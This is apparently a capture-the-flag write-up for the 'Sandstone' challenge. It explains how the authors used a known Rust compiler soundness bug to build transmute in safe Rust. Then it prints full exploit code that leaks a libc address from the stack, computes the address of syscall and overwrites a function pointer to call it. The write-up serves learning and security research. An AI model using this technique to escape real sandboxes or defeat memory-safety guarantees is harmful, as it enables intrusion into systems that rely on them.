# Sandstone

*Sandstone* is a problem about writing a [Rust](https://www.rust-lang.org/) code that invokes `syscall(0x1337)` in a sandboxed environment. Usually, the main goal of this kind of problems is finding a vulnerability in the sandbox logic, but this problem is not about that. Rust is a memory-safe language by default. It allows an additional unsafe operations, such as calling foreign functions or dereferencing a raw pointer, only in an `unsafe {}` block, which is prohibited in this problem.

We first observed that the problem turns on an optional feature called `nll` in nightly Rust, which stands for Non Lexical Lifetime (it is a Rust specific term, and it doesn't matter if you don't know what it means). We thought there must be a unsoundness hole in this feature, which will allow us to write `syscall(0x1337)` in safe Rust. Therefore, we searched for issues with [NLL-sound](https://github.com/rust-lang/rust/labels/NLL-sound) tag in the Rust repository. The description for the tag is `Working towards the "invalid code does not compile" goal` which seems like a perfect match for our situation. However, we didn't find anything that looks easily applicable to this problem.

Then, we changed our target to [I-unsound 💥](https://github.com/rust-lang/rust/labels/I-unsound 💥) tag and found the issue [Coherence can be bypassed by an indirect impl for a trait object #57893](https://github.com/rust-lang/rust/issues/57893). There was [a comment](https://github.com/rust-lang/rust/issues/57893#issuecomment-500250283) which includes a [std::mem::transmute](https://doc.rust-lang.org/std/mem/fn.transmute.html) implementation in Safe Rust, which allows unrestricted conversion between any Rust types.

The `transmute()` implementation allowed us to search through the stack memory for a libc pointer. After that, we calculated the address of the syscall funcion from the leaked pointer. Finally, we overwrote a safe function pointer with syscall address and called it with an argument 0x1337.

This is our main exploit code:

```rust
const PTR_SIZE: usize = std::mem::size_of::<usize>();

fn read_val(addr: usize) -> usize {
    *transmute::<*mut usize, &mut usize>(addr as *mut usize)
}

fn find_index(base_ptr: usize) -> usize {
    let pattern = [0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1];
    let mut start_index = 0;
    loop {
        let start_ptr = base_ptr + PTR_SIZE * start_index;
        if (0..pattern.len()).into_iter().all(|index| {
            let val = read_val(start_ptr + PTR_SIZE * index);
            if pattern[index] == 0 {
                val == 0
            } else {
                val > 0
            }
        }) {
            let target_index = start_index + 11;
            let target_ptr = base_ptr + PTR_SIZE * target_index;
            println!("{:03} 0x{:016x} - {:016x}", target_index, target_ptr, read_val(target_ptr));
            return target_index;
        }
        start_index += 1;
    }
}

fn fake_syscall(arg: usize) {
}

fn update(ptr: &mut fn(usize), val: usize) {
    let ptr_ref = transmute::<_, &mut usize>(ptr);
    *ptr_ref = val;
}

fn poc() {
    let stack = 0xabcdef0123456789usize;
    let mut ptr = (&stack as *const usize) as usize;
    println!("Current stack pointer: 0x{:016x}", ptr);

    let count = 200;

    ptr -= PTR_SIZE * count;
    let base_ptr = ptr;

    for i in 0..count {
        println!("{:03} 0x{:016x} - {:016x}", i, ptr, read_val(ptr));
        ptr += PTR_SIZE;
    }

    let lib_target_index = find_index(base_ptr);
    let lib_base = read_val(base_ptr + PTR_SIZE * lib_target_index) - 0x151e0;
    println!("lib{} base addr: 0x{:016x}", 'c', lib_base);

    let syscall_addr = lib_base + 0x1172d0;
    println!("lib{} syscall addr: 0x{:016x}", 'c', syscall_addr);

    let mut syscall_ptr: fn(usize) = fake_syscall;
    update(&mut syscall_ptr, syscall_addr);
    syscall_ptr(0x1337);

    println!("Please give me the flag");
    loop {
    }
}
```

According to the flag, the intended solution was to use [Pattern guard can consume value that is being matched #31287](https://github.com/rust-lang/rust/issues/31287).